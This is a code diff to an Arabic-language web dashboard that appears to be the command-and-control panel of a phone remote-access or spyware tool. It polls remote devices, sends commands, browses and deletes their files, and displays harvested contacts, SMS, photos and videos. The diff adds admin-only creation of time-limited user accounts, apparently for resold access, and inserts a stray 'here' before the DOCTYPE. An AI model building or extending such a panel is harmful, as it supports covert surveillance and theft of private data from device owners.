@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>XControl-Alsabry — لوحة التحكم</title>
+<title>XControl-E/Alsabry-لوحة تحكم الصبري</title>
 <style>
   * { box-sizing: border-box; }
   body { background: #0d1117; color: #e6edf3; font-family: Tahoma, Arial, sans-serif; margin: 0; padding: 14px; }
@@ -28,11 +28,13 @@
   img, video { max-width: 280px; border-radius: 6px; margin-top: 6px; }
   audio { margin-top: 6px; width: 100%; }
   a { color: #58a6ff; }
+  .hidden { display: none; }
+  .users-box { border: 1px solid #30363d; border-radius: 8px; padding: 12px; margin-bottom: 12px; background: #161b22; }
 </style>
 </head>
 <body>
 
-<h1>🎛 XControl-Alsabry — لوحة التحكم</h1>
+<h1>🎛 XControl-E/Alsabry — لوحة تحكم الصبري</h1>
 
 <div class="bar">
   <select id="dev" style="flex:1">
@@ -40,7 +42,21 @@
   </select>
   <button class="blue" onclick="loadDevices()">🔄 تحديث الأجهزة</button>
   <button onclick="clearHistory()">🧹 مسح السجل</button>
+  <button id="btnUsers" class="hidden" onclick="toggleUsers()">👥 المستخدمون</button>
   <button class="red" onclick="logout()">🚪 خروج</button>
+</div>
+
+<div id="usersBox" class="users-box hidden">
+  <b>👥 إدارة المستخدمين (المدير فقط)</b>
+  <div class="bar" style="margin-top:10px">
+    <input id="nuUser" placeholder="اسم المستخدم الجديد">
+    <input id="nuPass" placeholder="كلمة المرور">
+    <input id="nuHours" type="number" min="1" max="8760" value="24" style="max-width:90px" title="مدة الصلاحية بالساعات">
+    <button onclick="createUser()">➕ إنشاء</button>
+  </div>
+  <table id="usersTable">
+    <tr><th>المستخدم</th><th>تاريخ الإنشاء</th><th>ينتهي في</th><th>الحالة</th><th></th></tr>
+  </table>
 </div>
 
 <div class="grid">
@@ -79,6 +95,7 @@
 <script>
 const seen = {};
 let rowActs = [];
+let IS_ADMIN = false;
 
 function esc(s) {
   return String(s == null ? '' : s).replace(/[&<>"']/g, c =>
@@ -111,6 +128,64 @@ async function api(path, body) {
   return j;
 }
 
+// ====== معرفة نوع الجلسة (مدير أو مستخدم) ======
+async function checkMe() {
+  try {
+    const r = await fetch('/api/me');
+    const j = await r.json();
+    if (r.ok && j.isAdmin) {
+      IS_ADMIN = true;
+      document.getElementById('btnUsers').classList.remove('hidden');
+      loadUsers();
+    }
+  } catch (e) {}
+}
+
+// ====== إدارة المستخدمين ======
+function toggleUsers() {
+  const box = document.getElementById('usersBox');
+  box.classList.toggle('hidden');
+  if (!box.classList.contains('hidden')) loadUsers();
+}
+async function loadUsers() {
+  try {
+    const list = await api('/api/users', {});
+    const tb = document.getElementById('usersTable');
+    tb.innerHTML = '<tr><th>المستخدم</th><th>تاريخ الإنشاء</th><th>ينتهي في</th><th>الحالة</th><th></th></tr>';
+    list.forEach(u => {
+      const tr = document.createElement('tr');
+      tr.innerHTML = '<td>' + esc(u.username) + '</td>' +
+        '<td>' + new Date(u.createdAt).toLocaleString('ar') + '</td>' +
+        '<td>' + new Date(u.expiresAt).toLocaleString('ar') + '</td>' +
+        '<td>' + (u.active ? '<span class="on">نشط</span>' : '<span class="off">منتهي</span>') + '</td>' +
+        '<td><button class="red" onclick="delUser(\'' + esc(u.username) + '\')">🗑 حذف</button></td>';
+      tb.appendChild(tr);
+    });
+  } catch (e) { log('❌ ' + e.message); }
+}
+async function createUser() {
+  const username = document.getElementById('nuUser').value.trim();
+  const password = document.getElementById('nuPass').value;
+  const hours = parseInt(document.getElementById('nuHours').value) || 24;
+  if (!username || !password) { log('⚠ أدخل اسم المستخدم وكلمة المرور'); return; }
+  try {
+    const j = await api('/api/users', { username, password, hours });
+    log('✅ أُنشئ المستخدم "' + j.username + '" حتى ' + new Date(j.expiresAt).toLocaleString('ar'));
+    document.getElementById('nuUser').value = '';
+    document.getElementById('nuPass').value = '';
+    loadUsers();
+  } catch (e) { log('❌ ' + e.message); }
+}
+async function delUser(username) {
+  if (!confirm('حذف المستخدم "' + username + '"؟')) return;
+  try {
+    await api('/api/users', { username });
+    log('🗑 حُذف المستخدم "' + username + '"');
+    loadUsers();
+  } catch (e) { log('❌ ' + e.message); }
+}
+
+// ====== الأجهزة والأوامر ======
 async function loadDevices() {
   const sel = document.getElementById('dev');
   const prev = sel.value;
@@ -200,7 +275,6 @@ function render(h) {
     (h.fname ? ' · ' + esc(h.fname) : '') +
     (h.size ? ' · ' + fmt(h.size) : '');
 
-  // ① نتيجة ملف (صورة/صوت/فيديو/أي ملف): رابط تنزيل + معاينة — تعمل حتى للملفات الصغيرة
   if (h.fname) {
     const url = '/api/file/' + encodeURIComponent(h.cmdId);
     const ext = (h.fname || '').split('.').pop().toLowerCase();
@@ -214,8 +288,6 @@ function render(h) {
   } else if (h.data) {
     try {
       const d = JSON.parse(h.data);
-
-      // ② مستكشف الملفات: مجلدات وملفات مع أزرار فتح/تنزيل/حذف
       if (d && Array.isArray(d.items)) {
         const cur = esc(d.path || '');
         const par = esc(d.parent || '');
@@ -235,8 +307,6 @@ function render(h) {
           html += '</td></tr>';
         });
         html += '</table>';
-
-      // ③ جدول بيانات (جهات اتصال، SMS، صور، فيديوهات...) مع أزرار
       } else if (Array.isArray(d) && d.length && typeof d[0] === 'object') {
         rowActs = [];
         html += '<table><tr><th>#</th>' + Object.keys(d[0]).map(k => '<th>' + esc(k) + '</th>').join('') + '<th>إجراءات</th></tr>';
@@ -258,8 +328,6 @@ function render(h) {
           html += '<td>' + btns + '</td></tr>';
         });
         html += '</table>';
-
-      // ④ كائن بسيط: جدول مفتاح/قيمة
       } else if (typeof d === 'object' && d !== null) {
         html += '<table>' + Object.entries(d).map(([k, v]) =>
           '<tr><td><b>' + esc(k) + '</b></td><td>' + esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</td></tr>'
@@ -301,6 +369,7 @@ function logout() {
   location.href = '/';
 }
 
+checkMe();
 loadDevices();
 setInterval(loadDevices, 30000);
 setInterval(pollResults, 3000);
